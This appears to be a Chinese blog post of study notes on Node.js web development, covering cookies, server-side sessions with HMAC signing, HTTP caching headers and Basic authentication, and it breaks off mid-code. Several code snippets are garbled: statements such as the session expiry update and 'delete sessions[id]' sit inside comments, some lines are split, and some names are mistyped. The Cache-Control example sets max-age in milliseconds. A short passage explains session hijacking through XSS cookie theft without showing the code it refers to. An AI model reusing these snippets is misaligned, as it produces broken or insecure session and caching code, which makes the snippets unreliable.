<p>简而言之就是，为不需要Cookie的组件换个域名可以实现减少无效Cookie的传输。所以很多网站的静态文件会有特别的域名，使得业务相关的Cookie不再影响静态资源。当然换用额外的域名带来的好处不只这点，还可以突破浏览器下载线程数量的限制，因为域名不同，可以将下载线程数翻倍。但是换用额外域名还是有一定的缺点的，那就是将域名转换为IP需要进行DNS查询，多一个域名就多一次DNS查询。</p>
<p><strong>YSlow中有这样一条规则：减少DNS查询</strong></p>
<p>看起来减少DNS查询和使用不同的域名是冲突的两条规则，但是好在现今的浏览器都会进行DNS缓存，以削弱这个副作用的影响。</p>
<p>Cookie除了可以通过后端添加协议头的字段设置外，在前端浏览器中也可以通过JavaScript进行修改，浏览器将Cookie通过document.cookie暴露给了JavaScript。前端在修改Cookie之后，后续的网络请求中就会携带上修改过后的值</p>
<p>目前，广告和在线统计领域是最为依赖Cookie的，通过嵌入第三方的广告或者统计脚本，将Cookie和当前页面绑定，这样就可以标识用户，得到用户的浏览行为，广告商就可以定向投放广告了。尽管这样的行为看起来很可怕，但是从Cookie的原理来说，它只能做到标识，而不能做任何具有破坏性的事情。如果依然担心自己站点的用户被记录下行为，那就不要挂任何第三方的脚本</p>
<h3 id="8-1-5-Session"><a href="#8-1-5-Session" class="headerlink" title="8.1.5 Session"></a>8.1.5 Session</h3><p>通过Cookie，浏览器和服务器可以实现状态的记录。但是Cookie并非是完美的，前文提及的体积过大就是一个显著的问题，最为严重的问题是Cookie可以在前后端进行修改，因此数据就极容易被篹改和伪造。如果服务器端有部分逻辑是根据Cookie中的isVIP字段进行判断，那么一个普通用户通过修改Cookie就可以轻松享受到VIP服务了。综上所述，Cookie对于敏感数据的保护是无效的</p>
<p>为了解决Cookie敏感数据的问题，Session应运而生。Session的数据只保留在服务器端，客户端无法修改，这样数据的安全性得到一定的保障，数据也无须在协议中每次都被传递。</p>
<p>虽然在服务器端存储数据十分方便，但是如何将每个客户和服务器中的数据一一对应起来，这里有常见的两种实现方式。</p>
<ul>
<li>第一种：基于Cookie来实现用户和数据的映射</li>
</ul>
<p>虽然将所有数据都放在Cookie中不可取，但是将口令放在Cookie中还是可以的。因为口令一旦被篹改，就丢失了映射关系，也无法修改服务器端存在的数据了。并且Session的有效期通常较短，普遍的设置是20分钟，如果在20分钟内客户端和服务器端没有交互产生，服务器端就将数据删除。由于数据过期时间较短，且在服务器端存储数据，因此安全性相对较高。那么口令是如何产生的呢？一旦服务器端启用了Session，它将约定一个键值作为Session的口令，这个值可以随意约定，比如Connect默认采用connect_uid，Tomcat会采用jsessionid等。一旦服务器检查到用户请求Cookie中没有携带该值，它就会为之生成一个值，这个值是唯一且不重复的值，并设定超时时间。</p>
<p>以下为生成session的代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> sessions = &#123;&#125;;</div><div class="line"><span class="keyword">var</span> key = <span class="string">'session_id'</span>;</div><div class="line"><span class="keyword">var</span> EXPIRES = <span class="number">20</span> * <span class="number">60</span> * <span class="number">1000</span>;</div><div class="line"><span class="keyword">var</span> generate = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> session = &#123;&#125;;</div><div class="line">  session.id = (<span class="keyword">new</span> <span class="built_in">Date</span>()).getTime() + <span class="built_in">Math</span>.random();</div><div class="line">  session.cookie = &#123;</div><div class="line">    <span class="attr">expire</span>: (<span class="keyword">new</span> <span class="built_in">Date</span>()).getTime() + EXPIRES</div><div class="line">  &#125;;</div><div class="line">  sessions[session.id] = session;</div><div class="line">  <span class="keyword">return</span> session;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>每个请求到来时，检查Cookie中的口令与服务器端的数据，如果过期，就重新生成，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> id = req.cookies[key];</div><div class="line">  <span class="keyword">if</span> (!id) &#123;</div><div class="line">    req.session = generate();</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">var</span> session = sessions[id];</div><div class="line">    <span class="keyword">if</span> (session) &#123;</div><div class="line">      <span class="keyword">if</span> (session.cookie.expire &gt; (<span class="keyword">new</span> <span class="built_in">Date</span>()).getTime()) &#123;</div><div class="line">        <span class="comment">// 更新超时时间 session.cookie.expire = (new</span></div><div class="line">        <span class="built_in">Date</span>()).getTime() + EXPIRES;</div><div class="line">      req.session = session;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">      <span class="comment">// 超时了，删除旧的数据，并重新生成 delete sessions[id];</span></div><div class="line">      req.session = generate();</div><div class="line">    &#125;</div><div class="line">  &#125; <span class="keyword">else</span> &#123; <span class="comment">// 如果session过期或口令不对，重新生成session</span></div><div class="line">    req.session = generate();</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">handle(req, res);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>当然仅仅重新生成Session还不足以完成整个流程，还需要在响应给客户端时设置新的值，以便下次请求时能够对应服务器端的数据。这里我们hack响应对象的writeHead()方法，在它的内部注入设置Cookie的逻辑，</p>
<p>如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> writeHead = res.writeHead;</div><div class="line">res.writeHead = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> cookies = res.getHeader(<span class="string">'Set-Cookie'</span>);</div><div class="line">  <span class="keyword">var</span> session =</div><div class="line">    serialize(<span class="string">'Set-Cookie'</span>, req.session.id);</div><div class="line">  cookies = <span class="built_in">Array</span>.isArray(cookies) ? cookies.concat(session) : [cookies,</div><div class="line">    session</div><div class="line">  ];</div><div class="line">  res.setHeader(<span class="string">'Set-Cookie'</span>, cookies);</div><div class="line">  <span class="keyword">return</span> writeHead.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>session在前后端进行对应的过程就完成了。这样的业务逻辑可以判断和设置session，以此来维护用户与服务器端的关系</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> handle = <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span> (!req.session.isVisit) &#123;</div><div class="line">    res.session.isVisit = <span class="literal">true</span>;</div><div class="line">    res.writeHead(<span class="number">200</span>);</div><div class="line">    res.end(<span class="string">'欢迎第一次来到动物园'</span>);</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    res.writeHead(<span class="number">200</span>);</div><div class="line">    res.end(<span class="string">'动物园再次欢迎你'</span>);</div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>这样在session中保存的数据比直接在Cookie中保存数据要安全得多。这种实现方案依赖Cookie实现，而且也是目前大多数Web应用的方案。如果客户端禁止使用Cookie，这个世界上大多数的网站将无法实现登录等操作。</p>
<p>第二种：通过查询字符串来实现浏览器端和服务器端数据的对应</p>
<p>它的原理是检查请求的查询字符串，如果没有值，会先生成新的带值的URL，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> getURL = <span class="function"><span class="keyword">function</span> (<span class="params">_url, key, value</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> obj = url.parse(_url, <span class="literal">true</span>);</div><div class="line">  obj.query[key] = value;</div><div class="line">  <span class="keyword">return</span> url.format(obj);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>然后形成跳转，让客户端重新发起请求，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> redirect = <span class="function"><span class="keyword">function</span> (<span class="params">url</span>) </span>&#123;</div><div class="line">    res.setHeader(<span class="string">'Location'</span>, url);</div><div class="line">    res.writeHead(<span class="number">302</span>);</div><div class="line">    res.end();</div><div class="line">  &#125;;</div><div class="line">  <span class="keyword">var</span> id = req.query[key];</div><div class="line">  <span class="keyword">if</span> (!id) &#123;</div><div class="line">    <span class="keyword">var</span> session = generate();</div><div class="line">    redirect(getURL(req.url, key, session.id));</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">var</span> session = sessions[id];</div><div class="line">    <span class="keyword">if</span> (session) &#123;</div><div class="line">      <span class="keyword">if</span> (session.cookie.expire &gt; (<span class="keyword">new</span> <span class="built_in">Date</span>()).getTime()) &#123; <span class="comment">// 更新超时时间</span></div><div class="line">        session.cookie.expire = (<span class="keyword">new</span> <span class="built_in">Date</span>()).getTime() + EXPIRES;</div><div class="line">        req.session =</div><div class="line">          session;</div><div class="line">        handle(req, res);</div><div class="line">      &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="comment">// 超时了，删除旧的数据，并重新生成 delete sessions[id];</span></div><div class="line">        <span class="keyword">var</span> session = generate();</div><div class="line">        redirect(getURL(req.url, key, session.id));</div><div class="line">      &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">      <span class="comment">// 如果session过期或口令不对，重新生成session</span></div><div class="line">      <span class="keyword">var</span> session = generate();</div><div class="line">      redirect(getURL(req.url, key, session.id));</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>用户访问<a href="http://localhost/pathname时，如果服务器端发现查询字符串中不带`session_id`" target="_blank" rel="external">http://localhost/pathname时，如果服务器端发现查询字符串中不带`session_id`</a> 参数，就会将用户跳转到<code>http://localhost/pathname?session_id=12344567</code>这样一个类似的地址。如果浏览器收到302状态码和Location报头，就会重新发起新的请求，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt; HTTP/1.1 302 Moved Temporarily </div><div class="line">&lt; Location: /pathname?session_id=12344567</div></pre></td></tr></table></figure>
<p>这样，新的请求到来时就能通过Session的检查，除非内存中的数据过期。</p>
<p>有的服务器在客户端禁用Cookie时，会采用这种方案实现退化。通过这种方案，无须在响应时设置Cookie。但是这种方案带来的风险远大于基于Cookie实现的风险，因为只要将地址栏中的地址发给另外一个人，那么他就拥有跟你相同的身份。Cookie的方案在换了浏览器或者换了电脑之后无法生效，相对较为安全。</p>
<p>还有一种比较有趣的处理Session的方式是利用HTTP请求头中的ETag，同样对于更换浏览器和电脑后也是无效的</p>
<h3 id="Session与内存"><a href="#Session与内存" class="headerlink" title="Session与内存"></a>Session与内存</h3><p>在上面的示例代码中，我们都将Session数据直接存在变量sessions中，它位于内存中。然而在第5章的内存控制部分，我们分析了为什么Node会存在内存限制，这里将数据存放在内存中将会带来极大的隐患，如果用户增多，我们很可能就接触到了内存限制的上限，并且内存中的数据量加大，必然会引起垃圾回收的频繁扫描，引起性能问题。另一个问题则是我们可能为了利用多核CPU而启动多个进程，这个细节在第9章中有详细描述。用户请求的连接将可能随意分配到各个进程中，Node的进程与进程之间是不能直接共享内存的，用户的Session可能会引起错乱。<br>为了解决性能问题和Session数据无法跨进程共享的问题，常用的方案是将Session集中化，将原本可能分散在多个进程里的数据，统一转移到集中的数据存储中。目前常用的工具是Redis、Memcached等，通过这些高效的缓存，Node进程无须在内部维护数据对象，垃圾回收问题和内存限制问题都可以迎刃而解，并且这些高速缓存设计的缓存过期策略更合理更高效，比在Node中自行设计缓存策略更好。</p>
<p>采用第三方缓存来存储Session引起的一个问题是会引起网络访问。理论上来说访问网络中的数据要比访问本地磁盘中的数据速度要慢，因为涉及到握手、传输以及网络终端自身的磁盘I/O等，尽管如此但依然会采用这些高速缓存的理由有以下几条：</p>
<ul>
<li>Node与缓存服务保持长连接，而非频繁的短连接，握手导致的延迟只影响初始化。</li>
<li>高速缓存直接在内存中进行数据存储和访问。</li>
<li>缓存服务通常与Node进程运行在相同的机器上或者相同的机房里，网络速度受到的影响较小。</li>
</ul>
<p>尽管采用专门的缓存服务会比直接在内存中访问慢，但其影响小之又小，带来的好处却远远大于直接在Node中保存数据。为此，一旦Session需要异步的方式获取，代码就需要略作调整，变成异步的方式，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> id = req.cookies[key];</div><div class="line">  <span class="keyword">if</span> (!id) &#123;</div><div class="line">    req.session = generate();</div><div class="line">    handle(req, res);</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    store.get(id, <span class="function"><span class="keyword">function</span> (<span class="params">err, sesson</span>) </span>&#123;</div><div class="line">        <span class="keyword">if</span> (session) &#123;</div><div class="line">          <span class="keyword">if</span> (session.cookie.expire &gt; (<span class="keyword">new</span> <span class="built_in">Date</span>()).getTime()) &#123;</div><div class="line">            <span class="comment">// 更新超时时间 session.cookie.expire = (new</span></div><div class="line">            <span class="built_in">Date</span>()).getTime() + EXPIRES;</div><div class="line">          req.session = session;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">          <span class="comment">// 超时了，删除旧的数据，并重新生成 delete sessions[id];</span></div><div class="line">          req.session = generate();</div><div class="line">        &#125;</div><div class="line">      &#125; <span class="keyword">else</span> &#123; <span class="comment">// 如果session过期或口令不对，重新生成session</span></div><div class="line">        req.session = generate();</div><div class="line">      &#125;</div><div class="line">      handle(req, res);</div><div class="line">    &#125;);</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在响应时，将新的session保存回缓存中，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> writeHead = res.writeHead;</div><div class="line">res.writeHead = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> cookies = res.getHeader(<span class="string">'Set-Cookie'</span>);</div><div class="line">  <span class="keyword">var</span> session = serialize(<span class="string">'Set-Cookie'</span>, req.session.id);</div><div class="line">  cookies =</div><div class="line">    <span class="built_in">Array</span>.isArray(cookies) ? cookies.concat(session) : [cookies, session];</div><div class="line">  res.setHeader(<span class="string">'Set-Cookie'</span>, cookies); <span class="comment">// 保存回缓存</span></div><div class="line">  store.save(req.session);</div><div class="line">  <span class="keyword">return</span> writeHead.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h3 id="Session与安全"><a href="#Session与安全" class="headerlink" title="Session与安全"></a>Session与安全</h3><p>从前文可以知道，尽管我们的数据都放置在后端了，使得它能保障安全，但是无论通过Cookie，还是查询字符串的实现方式，Session的口令依然保存在客户端，这里会存在口令被盗用的情况。如果Web应用的用户十分多，自行设计的随机算法的一些口令值就有理论机会命中有效的口令值。一旦口令被伪造，服务器端的数据也可能间接被利用。这里提到的Session的安全，就主要指如何让这个口令更加安全。有一种做法是将这个口令通过私钥加密进行签名，使得伪造的成本较高。客户端尽管可以伪造口令值，但是由于不知道私钥值，签名信息很难伪造。如此，我们只要在响应时将口令和签名进行对比，如果签名非法，我们将服务器端的数据立即过期即可，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> sign = <span class="function"><span class="keyword">function</span> (<span class="params">val, secret</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> val + <span class="string">'.'</span> + crypto.createHmac(<span class="string">'sha256'</span>, secret)</div><div class="line">    .update(val).digest(<span class="string">'base64'</span>)</div><div class="line">    .replace(<span class="regexp">/\=+$/</span>, <span class="string">''</span>);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>在响应时，设置session值到Cookie中或者跳转URL中，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> val = sign(req.sessionID,secret);</div><div class="line">res.setHeader(<span class="string">'Set-Cookie'</span>, cookie.serialize(key, val));</div></pre></td></tr></table></figure>
<p>接收请求时，检查签名，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="comment">// 取出口令部分进行签名，对比用户提交的值 </span></div><div class="line"><span class="keyword">var</span> unsign = <span class="function"><span class="keyword">function</span> (<span class="params">val, secret</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> str = val.slice(<span class="number">0</span>, val.lastIndexOf(<span class="string">'.'</span>));</div><div class="line">  <span class="keyword">return</span> sign(str, secret) == val ? str : <span class="literal">false</span>;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>这样一来，即使攻击者知道口令中.号前的值是服务器端Session的ID值，只要不知道secret私钥的值，就无法伪造签名信息，以此实现对Session的保护。该方法被Connect中间件框架所使用，保护好私钥，就是在保障自己Web应用的安全。</p>
<p>当然，将口令进行签名是一个很好的解决方案，但是如果攻击者通过某种方式获取了一个真实的口令和签名，他就能实现身份的伪装。一种方案是将客户端的某些独有信息与口令作为原值，然后签名，这样攻击者一旦不在原始的客户端上进行访问，就会导致签名失败。这些独有信息包括用户IP和用户代理（User Agent）。但是原始用户与攻击者之间也存在上述信息相同的可能性，如局域网出口IP相同，相同的客户端信息等，不过纳入这些考虑能够提高安全性。通常而言，将口令存在Cookie中不容易被他人获取，但是一些别的漏洞可能导致这个口令被泄漏，典型的有XSS漏洞，下面简单介绍一下如何通过XSS拿到用户的口令，实现伪造。</p>
<p><code>XSS</code>的全称是<code>跨站脚本攻击（CrossSite Scripting，通常简称为XSS）</code></p>
<p>通常都是由网站开发者决定哪些脚本可以执行在浏览器端，不过XSS漏洞会让别的脚本执行。它的主要形成原因多数是用户的输入没有被转义，而被直接执行。</p>
<p>这段代码将该用户的Cookie提交给了c.com站点，这个站点就是攻击者的服务器，他也就能拿到该用户的Session口令。然后他在客户端中用这个口令伪造Cookie，从而实现了伪装用户的身份。如果该用户是网站管理员，就可能造成极大的危害。</p>
<p>XSS造成的危害远远不止这些，这里不再过多介绍。在这个案例中，如果口令中有用户的客户端信息的签名，即使口令被泄漏，除非攻击者与用户客户端完全相同，否则不能实现伪造。</p>
<h3 id="8-1-6-缓存"><a href="#8-1-6-缓存" class="headerlink" title="8.1.6 缓存"></a>8.1.6 缓存</h3><p>我们知道软件的架构经历过一次<code>C/S</code> 模式到<code>B/S</code>模式的演变，在HTTP之上构建的应用，其客户端除了比普通桌面应用具备更轻量的升级和部署等特性外，在跨平台、跨浏览器、跨设备上也具备独特优势。传统客户端在安装后的应用过程中仅仅需要传输数据，Web应用还需要传输构成界面的组件（HTML、JavaScript、CSS文件等）。这部分内容在大多数场景下并不经常变更，却需要在每次的应用中向客户端传递，如果不进行处理，那么它将造成不必要的带宽浪费。如果网络速度较差，就需要花费更多时间来打开页面，对于用户的体验将会造成一定影响。因此节省不必要的传输，对用户和对服务提供者来说都有好处。</p>
<p>为了提高性能，<strong>YSlow</strong>中也提到几条关于缓存的规则。添加Expires或Cache-Control到报文头中。<br>配置ETags。让Ajax可缓存。<br>这里我们将展开这几条规则的来源。如何让浏览器缓存我们的静态资源，这也是一个需要由服务器与浏览器共同协作完成的事情。</p>
<p>RFC 2616规范对此有一定的描述，只有遵循约定，整个缓存机制才能有效建立。通常来说，POST、DELETE、PUT这类带行为性的请求操作一般不做任何缓存，大多数缓存只应用在GET请求中。使用缓存的流程如图8-1所示。</p>
<p>简单来讲，本地没有文件时，浏览器必然会请求服务器端的内容，并将这部分内容放置在本地的某个缓存目录中。在第二次请求时，它将对本地文件进行检查，如果不能确定这份本地文件是否可以直接使用，它将会发起一次条件请求。所谓条件请求，就是在普通的GET请求报文中，附带If-Modified-Since字段，如下所示：<br>If-Modified-Since: Sun, 03 Feb 2013 06:01:12 GMT它将询问服务器端是否有更新的版本，本地文件的最后修改时间。如果服务器端没有新的版本，只需响应一个304状态码，客户端就使用本地版本。如果服务器端有新的版本，就将新的内容发送给客户端，客户端放弃本地版本。代码如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> handle = <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  fs.stat(filename, <span class="function"><span class="keyword">function</span> (<span class="params">err, stat</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> lastModified =</div><div class="line">      stat.mtime.toUTCString();</div><div class="line">    <span class="keyword">if</span> (lastModified === req.headers[<span class="string">'if-modified-since'</span>]) &#123;</div><div class="line">      res.writeHead(<span class="number">304</span>,</div><div class="line">        <span class="string">"Not Modified"</span>);</div><div class="line">      res.end();</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">      fs.readFile(filename, <span class="function"><span class="keyword">function</span> (<span class="params">err, file</span>) </span>&#123;</div><div class="line">        <span class="keyword">var</span> lastModified =</div><div class="line">          stat.mtime.toUTCString();</div><div class="line">        res.setHeader(<span class="string">"Last-Modified"</span>, lastModified);</div><div class="line">        res.writeHead(<span class="number">200</span>,</div><div class="line">          <span class="string">"Ok"</span>);</div><div class="line">        res.end(file);</div><div class="line">      &#125;);</div><div class="line">    &#125;</div><div class="line">  &#125;);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>这里的条件请求采用时间戳的方式实现，但是时间戳有一些缺陷存在。<br>文件的时间戳改动但内容并不一定改动。时间戳只能精确到秒级别，更新频繁的内容将无法生效。<br>为此HTTP1.1中引入了ETag来解决这个问题。ETag的全称是Entity Tag，由服务器端生成，服务器端可以决定它的生成规则。如果根据文件内容生成散列值，那么条件请求将不会受到时间戳改动造成的带宽浪费。下面是根据内容生成散列值的方法：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> getHash = <span class="function"><span class="keyword">function</span> (<span class="params">str</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> shasum = crypto.createHash(<span class="string">'sha1'</span>);</div><div class="line">  <span class="keyword">return</span> shasum.update(str).digest(<span class="string">'base64'</span>);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>与If-Modified-Since/Last-Modified不同的是，ETag的请求和响应是If-None-Match/ETag，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> handle = <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  fs.readFile(filename, <span class="function"><span class="keyword">function</span> (<span class="params">err, file</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> hash = getHash(file);</div><div class="line">    <span class="keyword">var</span> noneMatch = req[<span class="string">'if-none-match'</span>];</div><div class="line">    <span class="keyword">if</span> (hash === noneMatch) &#123;</div><div class="line">      res.writeHead(<span class="number">304</span>, <span class="string">"Not Modified"</span>);</div><div class="line">      res.end();</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">      res.setHeader(<span class="string">"ETag"</span>, hash);</div><div class="line">      res.writeHead(<span class="number">200</span>, <span class="string">"Ok"</span>);</div><div class="line">      res.end(file);</div><div class="line">    &#125;</div><div class="line">  &#125;);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>浏览器在收到<br>ETag: “83-1359871272000”</p>
<p>这样的请求后，在下次的请求中，会将其放置在请求头中：</p>
<p>If-None-Match:”83-1359871272000”。</p>
<p>尽管条件请求可以在文件内容没有修改的情况下节省带宽，但是它依然会发起一个HTTP请求，使得客户端依然会花一定时间来等待响应。可见最好的方案就是连条件请求都不用发起。那么如何让浏览器知晓是否能直接使用本地版本呢？答案就是服务器端在响应内容时，让浏览器明确地将内容缓存起来。如同YSlow规则里提到的，在响应里设置Expires或Cache-Control头，浏览器将根据该值进行缓存。那么这两个值有何区别呢？</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> handle = <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  fs.readFile(filename, <span class="function"><span class="keyword">function</span> (<span class="params">err, file</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> expires = <span class="keyword">new</span> <span class="built_in">Date</span>();</div><div class="line">    expires.setTime(expires.getTime() + <span class="number">10</span> * <span class="number">365</span> * <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">1000</span>);</div><div class="line">    res.setHeader(<span class="string">"Expires"</span>, expires.toUTCString());</div><div class="line">    res.writeHead(<span class="number">200</span>, <span class="string">"Ok"</span>);</div><div class="line">    res.end(file);</div><div class="line">  &#125;);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>Expires是一个GMT格式的时间字符串。浏览器在接到这个过期值后，只要本地还存在这个缓存文件，在到期时间之前它都不会再发起请求。YUI3的CDN实践是缓存文件在10年后过期。但是Expires的缺陷在于浏览器与服务器之间的时间可能不一致，这可能会带来一些问题，比如文件提前过期，或者到期后并没有被删除。</p>
<p>Cache-Control以更丰富的形式，实现相同的功能，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> handle = <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  fs.readFile(filename, <span class="function"><span class="keyword">function</span> (<span class="params">err, file</span>) </span>&#123;</div><div class="line">    res.setHeader(<span class="string">"Cache-Control"</span>,</div><div class="line">      <span class="string">"max-age="</span> + <span class="number">10</span> * <span class="number">365</span> * <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">1000</span>);</div><div class="line">    res.writeHead(<span class="number">200</span>, <span class="string">"Ok"</span>);</div><div class="line">    res.end(file);</div><div class="line">  &#125;);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>上面的代码为Cache-Control设置了max-age值，它比Expires优秀的地方在于，Cache-Control能够避免浏览器端与服务器端时间不同步带来的不一致性问题，只要进行类似倒计时的方式计算过期时间即可。除此之外，Cache-Control的值还能设置public、private、no-cache、no-store等能够更精细地控制缓存的选项。<br>由于在HTTP1.0时还不支持max-age，如今的服务器端在模块的支持下多半同时对Expires和Cache-Control进行支持。在浏览器中如果两个值同时存在，且被同时支持时，max-age会覆盖Expires。</p>
<h3 id="清除缓存"><a href="#清除缓存" class="headerlink" title="清除缓存"></a>清除缓存</h3><p>虽然我们知晓了如何设置缓存，以达到节省网络带宽的目的，但是缓存一旦设定，当服务器端意外更新内容时，却无法通知客户端更新。这使得我们在使用缓存时也要为其设定版本号，所幸浏览器是根据URL进行缓存，那么一旦内容有所更新时，我们就让浏览器发起新的URL请求，使得新内容能够被客户端更新。一般的更新机制有如下两种。每次发布，路径中跟随Web应用的版本号：<code>http://url.com/?v=20130501</code> .<br>每次发布，路径中跟随该文件内容的hash值：<code>http://url.com/?hash=afadfadwe</code> 。大体来说，根据文件内容的hash值进行缓存淘汰会更加高效，因为文件内容不一定随着Web应用的版本而更新，而内容没有更新时，版本号的改动导致的更新毫无意义，因此以文件内容形成的hash值更精准。</p>
<h3 id="8-1-7-Basic认证"><a href="#8-1-7-Basic认证" class="headerlink" title="8.1.7 Basic认证"></a>8.1.7 Basic认证</h3><h3 id="Basic认证"><a href="#Basic认证" class="headerlink" title="Basic认证"></a>Basic认证</h3><p>Basic认证是当客户端与服务器端进行请求时，允许通过用户名和密码实现的一种身份认证方式。这里简要介绍它的原理和它在服务器端通过Node处理的流程。</p>
<p>如果一个页面需要Basic认证，它会检查请求报文头中的Authorization字段的内容，该字段的值由认证方式和加密值构成，如下所示：<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$ curl -v &quot;http://user:pass@www.baidu.com/&quot;</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&gt; GET / HTTP/1.1</div><div class="line">&gt; Authorization: Basic dXNlcjpwYXNz </div><div class="line">&gt; User-Agent: curl/7.24.0 (x86_64-apple-darwin12.0) libcurl/7.24.0 OpenSSL/0.9.8r zlib/1.2.5</div><div class="line">&gt; Host: www.baidu.com </div><div class="line">&gt; Accept: */*</div></pre></td></tr></table></figure>
<p>在Basic认证中，它会将用户和密码部分组合： <code>username\+ &quot;:&quot; + password</code>。然后进行Base64编码，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> encode = <span class="function"><span class="keyword">function</span> (<span class="params">username, password</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> <span class="keyword">new</span> Buffer(username + <span class="string">':'</span> + password).toString(<span class="string">'base64'</span>);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>如果用户首次访问该网页，URL地址中也没携带认证内容，那么浏览器会响应一个401未授权的状态码，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> auth = req.headers[<span class="string">'authorization'</span>] || <span class="string">''</span>;</div><div class="line">  <span class="keyword">var</span> parts = auth.split(<span class="string">' '</span>);</div><div class="line">  <span class="keyword">var</span> method = parts[<span class="number">0</span>] || <span class="string">''</span>; <span class="comment">// Basic var encoded = parts[1] || ''; //</span></div><div class="line">  dXNlcjpwYXNz</div><div class="line">  <span class="keyword">var</span> decoded = <span class="keyword">new</span> Buffer(encoded,</div><div class="line">    <span class="string">'base64'</span>).toString(<span class="string">'utf-8'</span>).split(<span class="string">":"</span>);</div><div class="line">  <span class="keyword">var</span> user = decoded[<span class="number">0</span>]; <span class="comment">//</span></div><div class="line">  user</div><div class="line">  <span class="keyword">var</span> pass = decoded[<span class="number">1</span>]; <span class="comment">// pass if (!checkUser(user, pass)) &#123;</span></div><div class="line">  res.setHeader(<span 